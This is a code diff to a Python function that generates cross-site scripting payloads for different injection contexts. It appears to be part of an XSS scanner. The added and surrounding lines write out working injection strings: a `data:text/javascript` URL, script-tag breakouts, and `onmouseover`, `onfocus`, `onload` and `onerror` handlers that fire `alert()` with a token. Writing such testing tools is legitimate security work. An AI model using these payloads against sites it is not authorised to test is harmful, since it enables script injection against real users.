@@ -266,6 +266,11 @@ def payloads(site: Site, token: str) -> list[str]:
             # payload survives servers that escape quotes inside the value.
             out.append(f"alert(/{token}/)")
         if site.tag == "script":
+            if site.attr in URL_ATTRS:
+                if quote:
+                    out.append(f"data:text/javascript,{call}")
+                else:
+                    out.append(f"data:text/javascript,alert(/{token}/)")
             if quote:
                 out.append(f"{token}{quote}></script><svg/onload={call}>")
                 out.append(f"{token}{quote}></script><img src=x onerror={call}>")
@@ -301,6 +306,8 @@ def payloads(site: Site, token: str) -> list[str]:
                 out.append(f"{token}{quote} autofocus onfocus={event_quote}{call}{event_quote}")
                 out.append(f"{token}{quote} onmouseover={event_quote}{call}{event_quote}")
             else:
+                out.append(f"{token} onmouseover=alert(/{token}/) x=")
+                out.append(f"{token} autofocus onfocus=alert(/{token}/) x=")
                 out.append(f"{token} onmouseover={event_quote}{call}{event_quote} x=")
                 out.append(f"{token} autofocus onfocus={event_quote}{call}{event_quote} x=")
                 out.append(f"{token}><svg/onload={call}>")
